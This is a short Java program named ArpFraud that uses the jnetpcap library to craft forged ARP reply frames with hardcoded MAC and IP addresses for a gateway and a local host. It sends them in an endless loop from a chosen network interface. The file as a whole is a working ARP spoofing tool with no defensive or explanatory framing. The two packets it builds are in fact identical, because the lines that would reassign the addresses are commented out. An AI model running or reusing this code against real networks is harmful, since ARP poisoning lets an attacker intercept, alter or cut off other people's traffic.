package com.leyilikeang.common.example.my;

import com.leyilikeang.common.util.ConstantUtils;
import com.leyilikeang.common.util.PcapUtils;
import org.jnetpcap.Pcap;
import org.jnetpcap.packet.JMemoryPacket;
import org.jnetpcap.packet.JPacket;
import org.jnetpcap.protocol.JProtocol;

/**
 * Created by Goldmsg on 2018/10/22.
 */
public class ArpFraud {

    public static void main(String[] args) {
        String destinationMac = "ec 26 ca ff 9d 36";
        String destinationIp = "c0 a8 01 01";
        String sourceMac = "40 e2 30 df f9 ff";
        String sourceIp = "c0 a8 01 66";

        String responseToGateway = destinationMac + sourceMac
                + ConstantUtils.Ethernet.ETHER_TYPE_ARP.getValue()
                + ConstantUtils.Arp.HARDWARE_TYPE_ETHER.getValue()
                + ConstantUtils.Arp.UPPER_PROTOCOL_TYPE_IP.getValue()
                + ConstantUtils.Arp.MAC_LENGTH.getValue()
                + ConstantUtils.Arp.IP_LENGTH.getValue()
                + ConstantUtils.Arp.OPCODE_RESPONSE.getValue()
                + sourceMac + sourceIp + destinationMac + destinationIp;

//        destinationMac = "";
//        destinationIp = "";
//        sourceMac = "";
//        sourceIp = "";

        String responseToHost = destinationMac + sourceMac
                + ConstantUtils.Ethernet.ETHER_TYPE_ARP.getValue()
                + ConstantUtils.Arp.HARDWARE_TYPE_ETHER.getValue()
                + ConstantUtils.Arp.UPPER_PROTOCOL_TYPE_IP.getValue()
                + ConstantUtils.Arp.MAC_LENGTH.getValue()
                + ConstantUtils.Arp.IP_LENGTH.getValue()
                + ConstantUtils.Arp.OPCODE_RESPONSE.getValue()
                + sourceMac + sourceIp + destinationMac + destinationIp;

        final JPacket toGatewayPacket = new JMemoryPacket(JProtocol.ETHERNET_ID, responseToGateway);
        final JPacket toHostPacket = new JMemoryPacket(JProtocol.ETHERNET_ID, responseToHost);

        System.out.println(toGatewayPacket);
        System.out.println(toHostPacket);

        PcapUtils.getAllDevs();
        PcapUtils.index = 0;
        PcapUtils.useDev();

        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    if (PcapUtils.pcap.sendPacket(toGatewayPacket) != Pcap.OK) {
                        System.out.println(PcapUtils.pcap.getErr());
                    }
                    if (PcapUtils.pcap.sendPacket(toHostPacket) != Pcap.OK) {
                        System.out.println(PcapUtils.pcap.getErr());
                    }
                }
            }
        }).start();
    }
}
